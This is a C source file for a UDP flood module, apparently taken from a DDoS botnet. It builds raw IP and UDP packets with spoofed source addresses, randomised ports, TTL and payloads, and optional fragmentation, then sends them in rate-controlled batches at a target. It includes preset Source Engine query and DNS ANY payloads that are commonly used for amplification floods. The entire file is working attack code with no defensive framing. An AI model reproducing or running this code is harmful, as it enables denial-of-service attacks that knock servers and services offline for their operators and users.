#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <poll.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include "udp_method.h"
#include "../headers/protocol.h"
#include "../headers/attack_core.h"

#define MAX_UDP_PAYLOAD 1450

static const uint8_t VSE_PAYLOAD[] = {
    0xFF, 0xFF, 0xFF, 0xFF,
    0x54,
    'S', 'o', 'u', 'r', 'c', 'e', ' ',
    'E', 'n', 'g', 'i', 'n', 'e', ' ',
    'Q', 'u', 'e', 'r', 'y', 0x00
};
#define VSE_PAYLOAD_LEN 25

static const uint8_t DNS_PAYLOAD[] = {
    0x00, 0x01,
    0x01, 0x00,
    0x00, 0x01,
    0x00, 0x00,
    0x00, 0x00,
    0x00, 0x01,
    0x00,
    0x00, 0xFF,
    0x00, 0x01,
    0x00,
    0x00, 0x29,
    0x10, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00
};
#define DNS_PAYLOAD_LEN 28

static int get_mode_payload(uint8_t mode, uint8_t* buf, size_t buf_size) {
    switch (mode) {
        case MODE_UDP_VSE:
            if (buf_size < VSE_PAYLOAD_LEN) return 0;
            memcpy(buf, VSE_PAYLOAD, VSE_PAYLOAD_LEN);
            return VSE_PAYLOAD_LEN;

        case MODE_UDP_DNS:
            if (buf_size < DNS_PAYLOAD_LEN) return 0;
            memcpy(buf, DNS_PAYLOAD, DNS_PAYLOAD_LEN);
            buf[0] = attack_rand_next() & 0xFF;
            buf[1] = attack_rand_next() & 0xFF;
            return DNS_PAYLOAD_LEN;

        default:
            return 0;
    }
}

static uint16_t get_mode_default_port(uint8_t mode) {
    switch (mode) {
        case MODE_UDP_DNS:  return 53;
        case MODE_UDP_VSE:  return 27015;
        default:             return 0;
    }
}

void* udp_method(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = create_raw_socket();
    if (fd < 0) return NULL;

    attack_rand_init();

    uint8_t mode = get_attack_mode(params);
    uint8_t rand_level = get_rand_level(params);
    uint8_t ttl = get_ttl(params);
    uint8_t tos = get_tos(params);
    uint8_t frag_mode = get_frag_mode(params);
    spoof_config_t spoof = parse_spoof_option(params);

    attack_option* srcport_opt = find_option(params, OPT_SRCPORT);
    port_range_t srcport_range = parse_port_range(srcport_opt);

    uint16_t psize = get_packet_size(params, MAX_UDP_PAYLOAD);
    if (psize > MAX_UDP_PAYLOAD) psize = MAX_UDP_PAYLOAD;
    if (mode == MODE_UDP_DNS) psize = DNS_PAYLOAD_LEN;
    if (mode == MODE_UDP_VSE) psize = VSE_PAYLOAD_LEN;

    attack_option* payload_opt = find_option(params, OPT_PAYLOAD);

    /* Prepare payload data */
    uint8_t* payload_data = (uint8_t*)malloc(psize);
    if (!payload_data) {
        close(fd);
        return NULL;
    }

    int payload_len = psize;

    if (payload_opt && payload_opt->data && payload_opt->len > 0) {
        payload_len = (payload_opt->len < psize) ? payload_opt->len : psize;
        memcpy(payload_data, payload_opt->data, payload_len);
    } else if (mode == MODE_UDP_PLAIN) {
        for (int i = 0; i < psize; i++) {
            payload_data[i] = attack_rand_next() & 0xFF;
        }
    } else {
        int mlen = get_mode_payload(mode, payload_data, psize);
        if (mlen > 0) {
            payload_len = mlen;
        } else {
            for (int i = 0; i < psize; i++) {
                payload_data[i] = attack_rand_next() & 0xFF;
            }
        }
    }

    uint16_t dst_port = ntohs(params->target_addr.sin_port);
    uint16_t mode_port = get_mode_default_port(mode);
    if (mode_port > 0 && dst_port == 0) {
        dst_port = mode_port;
    }

    /* Build raw packets: IP + UDP + payload */
    size_t total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;

    char* packets[BATCH_SIZE];
    struct mmsghdr msgvec[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];
    struct sockaddr_in dest;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    for (int i = 0; i < BATCH_SIZE; i++) {
        packets[i] = (char*)malloc(total_len);
        if (!packets[i]) {
            for (int j = 0; j < i; j++) free(packets[j]);
            free(payload_data);
            close(fd);
            return NULL;
        }
        memset(packets[i], 0, total_len);

        /* Copy payload into packet template */
        uint8_t* pkt_payload = (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct udphdr));
        memcpy(pkt_payload, payload_data, payload_len);

        iov[i].iov_base = packets[i];
        iov[i].iov_len = total_len;

        memset(&msgvec[i], 0, sizeof(msgvec[i]));
        msgvec[i].msg_hdr.msg_name = &dest;
        msgvec[i].msg_hdr.msg_namelen = sizeof(dest);
        msgvec[i].msg_hdr.msg_iov = &iov[i];
        msgvec[i].msg_hdr.msg_iovlen = 1;
    }

    free(payload_data);

    int rand_partial = payload_len < 64 ? payload_len : 64;

    time_t end_time = time(NULL) + params->duration;
    int time_check_counter = 0;

    pps_tracker_t pps;
    pps_tracker_init(&pps, get_pps_limit(params));

    while (params->active) {
        if (!pps_should_send(&pps, BATCH_SIZE)) {
            long sleep_time = pps_sleep_us(&pps);
            if (sleep_time > 0) usleep(sleep_time);
            if (++time_check_counter > 2000) { time_check_counter = 0; if (time(NULL) > end_time) break; }
            continue;
        }

        for (int i = 0; i < BATCH_SIZE && params->active; i++) {
            struct iphdr* ip = (struct iphdr*)packets[i];
            struct udphdr* udp = (struct udphdr*)(packets[i] + sizeof(struct iphdr));
            uint8_t* pkt_payload = (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct udphdr));

            /* Randomize payload */
            if (mode == MODE_UDP_PLAIN || rand_level >= RAND_MEDIUM) {
                for (int p = 0; p < rand_partial; p++) {
                    pkt_payload[p] = attack_rand_next() & 0xFF;
                }
            }
            if (mode == MODE_UDP_DNS && rand_level >= RAND_BASIC && payload_len >= 2) {
                pkt_payload[0] = attack_rand_next() & 0xFF;
                pkt_payload[1] = attack_rand_next() & 0xFF;
            }

            /* Build UDP header */
            uint16_t src_port = get_random_port(&srcport_range);
            build_udp_header(udp, src_port, dst_port, payload_len);

            /* Build IP header with spoofed source */
            uint32_t src_ip = generate_spoofed_ip(&spoof);
            build_ip_header(ip, src_ip, params->target_addr.sin_addr.s_addr,
                IPPROTO_UDP, total_len,
                rand_level >= RAND_FULL ? attack_rand_next_range(48, 128) : ttl, tos);
            if (frag_mode != FRAG_NONE) apply_ip_frag(ip, frag_mode);

            /* UDP checksum */
            udp->check = 0;
            udp->check = tcp_udp_checksum(udp, sizeof(struct udphdr) + payload_len,
                ip->saddr, ip->daddr, IPPROTO_UDP);
        }

        int sent = sendmmsg_nonblock(fd, msgvec, BATCH_SIZE);
        if (sent == 0) {
            sched_yield();
        }

        if (++time_check_counter > 2000) {
            time_check_counter = 0;
            if (time(NULL) > end_time) break;
        }
    }

    for (int i = 0; i < BATCH_SIZE; i++) {
        free(packets[i]);
    }
    close(fd);
    return NULL;
}
